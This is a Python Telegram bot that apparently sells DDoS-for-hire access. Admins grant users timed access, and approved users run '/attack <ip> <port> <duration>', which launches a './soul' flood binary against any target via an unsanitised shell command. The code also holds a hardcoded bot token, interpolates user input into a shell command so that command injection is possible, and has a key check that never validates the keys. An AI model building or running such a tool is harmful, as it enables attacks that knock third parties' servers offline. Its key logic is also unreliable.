import asyncio
import json
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from datetime import datetime, timedelta

# Load configuration from config.json
with open("config.json", "r") as config_file:
    config = json.load(config_file)

TELEGRAM_BOT_TOKEN = config["7342723416:AAEPV7QPSVD11dmLDRYj0KGudhUzhuoHPfA"]
ADMIN_USER_ID = config["2060007339"]
USERS_FILE = config["USERS_FILE"]
attack_in_progress = False

def load_users():
    """Load users and remove expired ones on startup."""
    try:
        with open(USERS_FILE) as f:
            users = {}
            for line in f:
                parts = line.strip().split(':')
                if len(parts) == 2:
                    user_id, expiration_date = parts
                    # Check if user is still valid
                    if datetime.strptime(expiration_date, '%Y-%m-%d') > datetime.now():
                        users[user_id] = {"expiration": expiration_date}
                    else:
                        print(f"User {user_id} access expired and was removed.")
            save_users(users)  # Save only active users back to file
            return users
    except FileNotFoundError:
        return {}

def save_users(users):
    """Save the current valid users to file."""
    with open(USERS_FILE, 'w') as f:
        for user_id, data in users.items():
            f.write(f"{user_id}:{data['expiration']}\n")

def generate_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

# Load users at startup
users = load_users()
approved_users = {user_id for user_id in users.keys()}  # Cache for faster checks

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    username = update.effective_user.username or update.effective_user.first_name

    message = (
        f"🔥Welcome @{username}🔥,\n\n"
        "Use /attack to enjoy our service\n"
        "Use /redeem <key> to unlock access and owner is @Owner_Rockybhai"
    )

    # Escape MarkdownV2 special characters
    message = message.replace('@', r'\@').replace('_', r'\_').replace('*', r'\*').replace('~', r'\~').replace('`', r'\`').replace('>', r'\>').replace('#', r'\#').replace('+', r'\+').replace('-', r'\-').replace('.', r'\.')

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='MarkdownV2')

# Escape text for MarkdownV2
def escape_markdown_v2(text):
    escape_chars = r"_*[]()~`>#+-=|{}.!"
    return ''.join(['\\' + char if char in escape_chars else char for char in text])

async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only the admin can generate keys.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /genkey <user_id> <days>*", parse_mode='Markdown')
        return

    target_user_id = args[0].strip()
    days = int(args[1].strip())
    key = generate_key()  # Generate a key but do not store it
    expiration_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
    users[target_user_id] = {"expiration": expiration_date}
    save_users(users)  # Save users to persist the new expiration date
    approved_users.add(target_user_id)  # Update the in-memory cache

    # Escape values for MarkdownV2 formatting
    escaped_key = escape_markdown_v2(key)
    escaped_expiration_date = escape_markdown_v2(expiration_date)
    escaped_user_id = escape_markdown_v2(target_user_id)

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*✔️ Key generated for user {escaped_user_id}:*\n"
            f"```\n{escaped_key}\n```\n"
            f"*Expires on: {escaped_expiration_date}*"
        ),
        parse_mode='MarkdownV2'
    )
    print(f"Generated key for user {target_user_id}: {key}, expires on {expiration_date}")

async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = args[0].strip()

    if user_id in users:
        user_data = users[user_id]
        expiration_date = datetime.strptime(user_data["expiration"], '%Y-%m-%d')

        if datetime.now() <= expiration_date:
            approved_users.add(user_id)
            await context.bot.send_message(chat_id=chat_id, text="*✅ Key redeemed successfully! You now have access.*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text="*❌ Your key has expired. Please contact admin for a new key.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*❌ No valid access found. Please contact admin.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./soul {ip} {port} {duration} 10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in approved_users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to redeem a valid key to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Another attack is already in progress. Please wait.*",
            parse_mode='Markdown'
        )
        return

    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /attack <ip> <port> <duration>*",
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    attacker_username = update.effective_user.username if update.effective_user.username else "Unknown"

    attack_in_progress = True

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*🚀 Attack Sent Successfully! 🚀*\n"
            f"*🎯 Target: {ip}*\n"
            f"*🔐 Port: {port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*🕒 Attacker Name: @{attacker_username}*\n"
            f"*🔥 Give Feedback @Owner_Rockybhai💥*"
        ),
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()